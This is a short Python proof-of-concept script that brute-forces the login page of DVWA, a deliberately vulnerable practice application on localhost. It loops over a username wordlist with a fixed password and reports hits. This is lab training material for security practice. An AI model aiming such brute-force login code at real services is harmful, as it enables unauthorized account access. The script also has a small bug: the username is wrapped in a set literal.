"""
 @Author: UpDown
 @FileName: dvwa_brute_poc.py
 @Time: 2022/5/9 8:31
"""


import requests

cookies = {
    'security': 'low',
    'csrftoken': '4lCBHKyNLGNb644Bqq7oQgGZ0krFoAZz6f2AnIRdsOZc2c0G9D663b5Ef9szAl3Q',
    'PHPSESSID': 'ekn0c5tssdi0kl57bjgc8q2ql2',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    # Requests sorts cookies= alphabetically
    # 'Cookie': 'security=low; csrftoken=4lCBHKyNLGNb644Bqq7oQgGZ0krFoAZz6f2AnIRdsOZc2c0G9D663b5Ef9szAl3Q; PHPSESSID=ekn0c5tssdi0kl57bjgc8q2ql2',
    'Referer': 'http://127.0.0.1/dvwa/vulnerabilities/brute/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

# params = {
#     'username': 'admin',
#     'password': 'password',
#     'Login': 'Login',
# }
#
# response = requests.get('http://127.0.0.1/dvwa/vulnerabilities/brute/', params=params, cookies=cookies, headers=headers)
# if 'Welcome' in response.text:
#     print('welcome')
# print(response.text)


with open('./dict/all.txt', 'r', encoding='utf8') as f:
    for i in f.readlines():
        params = {
            'username': {i.replace('\n','')},
            'password': 'password',
            'Login': 'Login',
        }
        try:
            response = requests.get('http://127.0.0.1/dvwa/vulnerabilities/brute/', params=params, cookies=cookies,
                                    headers=headers)
            # print(type(response.status_code))
            if int(response.status_code) == 200 and "Welcome" in response.text:
                print("爆破成功：" + i.replace('\n','') + '\n')
            # print(type(response.status_code))
            # if response.status_code == 200 adn
        except:
            pass